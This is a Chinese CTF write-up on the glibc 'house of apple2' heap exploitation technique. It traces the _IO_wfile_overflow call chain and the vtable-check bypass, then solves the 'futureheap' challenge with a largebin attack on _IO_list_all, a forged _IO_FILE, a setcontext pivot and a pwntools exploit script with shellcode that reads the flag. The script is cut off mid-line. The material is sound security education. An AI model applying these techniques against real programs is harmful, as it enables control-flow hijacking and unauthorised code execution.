                     data-src="/blog/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241109154309187.png"
                      class=""
                >

<h6 id="IO-wfile-jumps"><a href="#IO-wfile-jumps" class="headerlink" title="_IO_wfile_jumps"></a>_IO_wfile_jumps</h6><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241109113127595.png"
                      class=""
                >

<h6 id="IO-file-jumps"><a href="#IO-file-jumps" class="headerlink" title="_IO_file_jumps"></a>_IO_file_jumps</h6><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241110004510956.png"
                      class=""
                >

<h6 id="IO-wide-data"><a href="#IO-wide-data" class="headerlink" title="_IO_wide_data"></a>_IO_wide_data</h6><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241109232015744.png"
                      class=""
                >

<blockquote>
<p>在glibc2.24以后加入了对虚函数的检测，在调用虚函数之前首先会检查虚函数地址的合法性。</p>
<p>其检查流程为：计算_IO_vtable 段的长度（section_length），用当前虚表指针的地址减去_IO_vtable  段的开始地址，如果vtable相对于开始地址的偏移大于等于section_length，那么就会进入_IO_vtable_check进行更详细的检查，否则的话会正常调用。如果vtable是非法的，进入_IO_vtable_check函数后会触发abort。</p>
<p>虽然对vtable的检查较为严格，但是对于具体位置和具体偏移的检测则是较为宽松的，可以修改vtable指针为虚表段内的任意位置，也就是对于某一个**_IO_xxx_jumps**的任意偏移，使得其调用攻击者想要调用的IO函数。</p>
</blockquote>
<p>我们的思路就是借鉴FSOP，用_wide_data这个成员结构体中的_wide_vtable，同样是宏调用，但没有进一步的检测。</p>
<h5 id="1-IO-wfile-overflow链"><a href="#1-IO-wfile-overflow链" class="headerlink" title="1._IO_wfile_overflow链"></a>1._IO_wfile_overflow链</h5><p>源码：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">_IO_wfile_overflow (FILE *f, <span class="type">wint_t</span> wch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_wide_data-&gt;_IO_write_base == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  _IO_wdoallocbuf (f);</span><br><span class="line">	  _IO_free_wbackup_area (f);</span><br><span class="line">	  _IO_wsetg (f, f-&gt;_wide_data-&gt;_IO_buf_base,</span><br><span class="line">		     f-&gt;_wide_data-&gt;_IO_buf_base, f-&gt;_wide_data-&gt;_IO_buf_base);</span><br><span class="line"></span><br><span class="line">	  <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">	      _IO_doallocbuf (f);</span><br><span class="line">	      _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">          ......</span><br><span class="line">    &#125;</span><br><span class="line">      </span><br><span class="line">      </span><br><span class="line">_IO_wdoallocbuf (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">if</span> (!(fp-&gt;_flags &amp; _IO_UNBUFFERED))</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WDOALLOCATE (fp) != WEOF)</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  _IO_wsetb (fp, fp-&gt;_wide_data-&gt;_shortbuf,</span><br><span class="line">		     fp-&gt;_wide_data-&gt;_shortbuf + <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">      </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WDOALLOCATE(FP) WJUMP0 (__doallocate, FP)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WJUMP0(FUNC, THIS) (_IO_WIDE_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WIDE_JUMPS_FUNC(THIS) _IO_WIDE_JUMPS(THIS)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WIDE_JUMPS(THIS) _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)-&gt;_wide_vtable</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_CAST_FIELD_ACCESS(THIS, TYPE, MEMBER) (*(_IO_MEMBER_TYPE (TYPE, MEMBER) *)(((char *) (THIS)) \</span></span><br><span class="line"><span class="meta">				       + offsetof(TYPE, MEMBER)))</span></span><br></pre></td></tr></table></figure></div>

<p>首先最终的目标是<code>_IO_wdoallocbuf</code>中的<code>(wint_t)_IO_WDOALLOCATE (fp)</code>的调用，追踪几个宏定义会发现，最终执行了<code>*(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)</code>这样一个函数。这里的_wide_vtable实际上就是一个虚表，其0x68偏移处就是<code>__doallocate</code>这一项。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241109155032548.png"
                      class=""
                >

<p>那么我们反向追溯一下，发现需要让如下的条件成立以绕过条件判断：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">fp-&gt;_wide_data-&gt;_IO_buf_base==<span class="number">0</span>;</span><br><span class="line">!(fp-&gt;_flags &amp; _IO_UNBUFFERED)!=<span class="number">0</span>;	<span class="comment">//(fp-&gt;_flags &amp; 0x2)==0;</span></span><br><span class="line">f-&gt;_wide_data-&gt;_IO_write_base == <span class="number">0</span>;</span><br><span class="line">f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING == <span class="number">0</span>;		<span class="comment">//f-&gt;_flags &amp; 0x800 == 0;</span></span><br><span class="line">f-&gt;_flags &amp; _IO_NO_WRITES==<span class="number">0</span>;		<span class="comment">//f-&gt;_flags &amp; 0x8==0;</span></span><br></pre></td></tr></table></figure></div>

<p>伪造的_IO_FILE对<code>fp</code>的设置如下：</p>
<ul>
<li><code>_flags</code>设置为<code>~(2 | 0x8 | 0x800)</code>，如果不需要控制<code>rdi</code>，设置为<code>0</code>即可；如果需要获得<code>shell</code>，可设置为<code> sh;</code>，注意前面有两个空格</li>
<li><code>vtable</code>设置为<code>_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_overflow</code>即可</li>
<li><code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code>，因为_IO_FILE的0xa0偏移处是_wide_data域。</li>
<li><code>_wide_data-&gt;_IO_write_base</code>设置为<code>0</code>，即满足<code>*(A + 0x18) = 0</code></li>
<li><code>_wide_data-&gt;_IO_buf_base</code>设置为<code>0</code>，即满足<code>*(A + 0x30) = 0</code></li>
<li><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></li>
<li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x68) = C</code></li>
</ul>
<p>由于触发FSOP的<code>_IO_flush_all_lockp</code>函数中有这么一条判断，所以我们要使前两个条件有一个为真，也就是<code>fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code> 或 <code>_IO_vtable_offset (fp) == 0 &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</code>，第一个条件比较好满足。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">     <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">			    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">   )</span><br><span class="line">  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">result = EOF;</span><br></pre></td></tr></table></figure></div>



<p>需要注意的是，最后是<code>call qword ptr [rax + 0x68]</code>实现跳转，所以在rax+0x68的位置不能直接是shellcode，而是一个合法的地址。在这里报错时就可以观察寄存器信息，这里rdx实质就指向我们之前伪造的fake_IO_FILE的_wide_data域。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241109200034550.png"
                      class=""
                >

<p>这里setcontext能够把rdx作为一个类sigFrame的指针，然后恢复各字段。然后就能够进行各种操作了，比如进行srop等等。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241109200645735.png"
                      class=""
                >

<p>现在我们来分析一下futureheap这道题</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241109221708861.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241109225750797.png"
                      class=""
                >

<p>首先这个init函数中是经典的伪随机数的利用，可以最终得到libc_base和一个fortune的地址，这个fortune是一个rwx的段，可以写shellcode然后想办法执行。这道题也刚好沙箱禁用了直接的execve调用和一些基本的orw函数。但是我们只要能劫持程序执行流，还是能比较方便的利用系统调用读取flag。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241109230302958.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241109230106028.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241109230119254.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241109230135976.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241109230148959.png"
                      class=""
                >

<p>还是比较经典的菜单题，主要功能有add，delete和edit。其中delete存在UAF，add只能申请largebin chunk。edit有3次机会，之后会直接调用exit退出。然后还存在一个函数，只要输对密码就能往fortune中写入0x500字节。这个密码的获取是一个简单的换表base64。</p>
<p>那么我们就可以开始学习house of apple2的利用了，首先就是用largebin attack来把_IO_list_all改成我们一个largebin chunk的地址，然后再在该largebin chunk中伪造IO_FILE结构体。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x528</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x520</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x518</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x550</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">log.success(<span class="string">&quot;_io_list_all:&quot;</span>+<span class="built_in">hex</span>(_IO_list_all))</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(_IO_list_all-<span class="number">0x20</span>))</span><br></pre></td></tr></table></figure></div>

<p>一开始的largebin attack过程就不过多赘述了，先留一个chunk在largebin里，改掉其bk_nextsize域为<code>tar-0x20</code>，然后再让一个较小的chunk进入到largebin时，就能触发glibc2.31版本以上的改单一地址的largebin attack。到这里我们的_IO_list_all被成功改写成largebin chunk的地址。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241109231242168.png"
                      class=""
                >

<p>然后最关键的就是这个<code>_IO_FILE</code>结构体的构造,由于我们是从数据域开始写，所以一开始的<code>_flags</code>和<code>_IO_read_ptr</code>是无法通过edit控制的。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">fake_IO_FILE  = p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>) + p64(<span class="number">2</span>) <span class="comment">#_write_base,_write_ptr</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)+p64(<span class="number">0</span>) <span class="comment">#_IO_buf_base,_IO_buf_end </span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)      <span class="comment">#_IO_save_base</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)      <span class="comment">#_IO_backup_base</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">5</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)       <span class="comment">#_lock</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(fortune+<span class="number">0x18</span>)    <span class="comment">#_wide_data</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xb0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)            <span class="comment"># _mode = 0</span></span><br><span class="line">fake_IO_FILE += p64(fortune+<span class="number">0x108</span>)       <span class="comment">#setcontext-&gt;rsp</span></span><br><span class="line">fake_IO_FILE += p64(fortune+<span class="number">0x108</span>)     <span class="comment">#setcontext-&gt;rcx</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xC8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(_IO_wfile_jumps)  <span class="comment"># vtable</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xf8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(fortune+<span class="number">0x100</span>-<span class="number">0x68</span>)</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(setcontext+<span class="number">61</span>) + shellcode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,fake_IO_FILE)</span><br><span class="line"></span><br><span class="line">passwd = <span class="string">&quot;74r0t#C@rd&quot;</span></span><br><span class="line">out()</span><br><span class="line">p.sendline(passwd)</span><br><span class="line">p.sendline(fake_IO_FILE)</span><br></pre></td></tr></table></figure></div>

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241109231530476.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241109233732611.png"
                      class=""
                >

<p>首先将<code>write_base</code>和<code>write_ptr</code>这两个字段分别置1和2，并且把mode置0是为了满足<code>_IO_flush_all_lockp</code>中一个条件，原理见上文。之后要把vtable指向<code>_IO_wfile_jumps</code>，这是因为虽然在glibc2.24及以上多了一个对虚表地址的检测，使其不能偏离所在段太远，但是我们还是可以利用附近的别的虚表进行利用。这里我们选择触发的是<code>_IO_wfile_jumps</code>的<code>_IO_wfile_overflow</code>。也就是<code>_IO_flush_all_lockp</code>中的<code>_IO_OVERFLOW (fp, EOF)</code>这个。因为多态的设计，虚表的结构都是一样的，所以我们本来是调用正常的overflow虚表函数，这里我们劫持到<code>_IO_wfile_jumps</code>后，我们调用的就是<code>__GI__IO_wfile_overflow</code>。然后其具体函数实现里给了我们可趁之机。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241109232222317.png"
                      class=""
                >

<p>然后就能进入<code>_IO_wfile_overflow</code>中。这里我们_flags字段为0，是能够满足里面的各种条件的。然后最关键的就是伪造的<code>IO_FILE</code>的<code>_wide_data</code>这个字段的赋值，因为我们没有堆的基址，但有一个fortune的地址，所以我们可以把伪造的<code>_wide_data</code>这个结构体放到fortune这个位置处，为了方便我们可以复用原来的伪造到堆上的IO_FILE结构，但是因为要使<code>f-&gt;_wide_data-&gt;_IO_write_base == 0</code>，所以我们进行一定的错位，这里我选择的是把<code>_wide_data</code>弄到<code>fortune+0x18</code>，这个位置去。然后就能满足下面这两个条件</p>
<blockquote>
<ul>
<li><code>_wide_data-&gt;_IO_write_base</code>设置为<code>0</code>，即满足<code>*(A + 0x18) = 0</code></li>
<li><code>_wide_data-&gt;_IO_buf_base</code>设置为<code>0</code>，即满足<code>*(A + 0x30) = 0</code></li>
</ul>
</blockquote>
<p>之后来看后面的构造，我们要找到一个B的位置，然后控制<code>*(B + 0x68)</code>，这样就能把我们的RIP劫持到目标地址处去了</p>
<blockquote>
<ul>
<li><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></li>
<li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x68) = C</code></li>
</ul>
</blockquote>
<p>也就是如下面这3部分的构造。由于我们最后是call到C这里，所以不能直接执行shellcode。我们可以通过setcontext来将rsp放到目标位置，然后setcontext中间会push一个rcx，所以我们可以连带着rcx设置为目标shellcode位置，最后ret到rcx指向的地址，也就执行了我们事先布置的shellcode了。这里rdx就是我们之前布置的<code>_wide_data</code>的位置，然后我们在不影响原来_IO_FILE利用时，设置对应偏移字段来达成特定寄存器的赋值。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">fake_IO_FILE += p64(fortune+<span class="number">0x100</span>-<span class="number">0x68</span>)</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(setcontext+<span class="number">61</span>) + shellcode</span><br></pre></td></tr></table></figure></div>

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241109235637786.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241109235847848.png"
                      class=""
                >

<p>exp:</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal=[<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line">table = <span class="string">&quot;polikujmyhntgbrfvedcwsxqazQWERTYUIOPASDFGHJKLZXCVBNM)!@#$%^&amp;*(+/&quot;</span></span><br><span class="line">libc = ctypes.CDLL(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>():</span><br><span class="line">    <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">glibc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">name = <span class="string">b&quot;a&quot;</span>*<span class="number">8</span> + p32(<span class="number">0x88888888</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;dear:&quot;</span>,name)</span><br><span class="line"></span><br><span class="line">libc.srand(<span class="number">0x88888888</span>)</span><br><span class="line">wolf = libc.rand()</span><br><span class="line">sword = libc.rand()</span><br><span class="line">log.success(<span class="string">&quot;wolf:&quot;</span>+<span class="built_in">str</span>(wolf)+<span class="string">&quot;  sword:&quot;</span>+<span class="built_in">str</span>(sword))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Lion is &quot;</span>)</span><br><span class="line">lion = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;.&#x27;</span>)[:-<span class="number">1</span>])</span><br><span class="line">log.success(<span class="string">&quot;Lion:&quot;</span>+<span class="built_in">str</span>(lion))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Snake is &quot;</span>)</span><br><span class="line">snake = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;.&#x27;</span>)[:-<span class="number">1</span>])</span><br><span class="line">log.success(<span class="string">&quot;snake:&quot;</span>+<span class="built_in">str</span>(snake))</span><br><span class="line"></span><br><span class="line">setvbuf_add = lion ^ wolf ^ libc.rand()</span><br><span class="line">libc_base = setvbuf_add - glibc.sym[<span class="string">&quot;setvbuf&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">v0 = snake ^ libc.rand()</span><br><span class="line">fortune = v0 ^ sword</span><br><span class="line">log.success(<span class="string">&quot;fortune:&quot;</span>+<span class="built_in">hex</span>(fortune))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">open</span>=libc_base+glibc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read=libc_base + glibc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write=libc_base + glibc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">stderr=libc_base+glibc.sym[<span class="string">&#x27;stderr&#x27;</span>]</span><br><span class="line">_IO_list_all=libc_base+glibc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">setcontext=libc_base + glibc.sym[<span class="string">&#x27;setcontext&#x27;</span>]</span><br><span class="line">_IO_wfile_jumps =libc_base+glibc.sym[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size</span>):</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">    p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">out</span>():</span><br><span class="line">    p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x528</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x520</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x518</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x550</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">log.success(<span class="string">&quot;_io_list_all:&quot;</span>+<span class="built_in">hex</span>(_IO_list_all))</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(_IO_list_all-<span class="number">0x20</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x600</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode=asm(<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rdi,0</span></span><br><span class="line"><span class="string">sub rdi,100</span></span><br><span class="line"><span class="string">mov rdx,0</span></span><br><span class="line"><span class="string">push rdx</span></span><br><span class="line"><span class="string">mov rdx,rsp</span></span><br><span class="line"><span class="string">mov rsi, 0x67616c662f</span></span><br><span class="line"><span class="string">push rsi</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">add rdx,0x100</span></span><br><span class="line"><span class="string">mov r10,0x18</span></span><br><span class="line"><span class="string">mov rax,0x1b5</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi, 1</span></span><br><span class="line"><span class="string">mov rsi, 3</span></span><br><span class="line"><span class="string">push 0</span></span><br><span class="line"><span class="string">mov rdx, rsp</span></span><br><span class="line"><span class="string">mov r10, 0x100</span></span><br><span class="line"><span class="string">push SYS_sendfile</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake_IO_FILE  = p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>) + p64(<span class="number">2</span>) <span class="comment">#_write_base,_write_ptr</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)+p64(<span class="number">0</span>) <span class="comment">#_IO_buf_base,_IO_buf_end </span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)      <span class="comment">#_IO_save_base</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)      <span class="comment">#_IO_backup_base</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">5</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)       <span class="comment">#_lock</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(fortune+<span class="number">0x18</span>)    <span class="comment">#_wide_data</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xb0</span>, <span 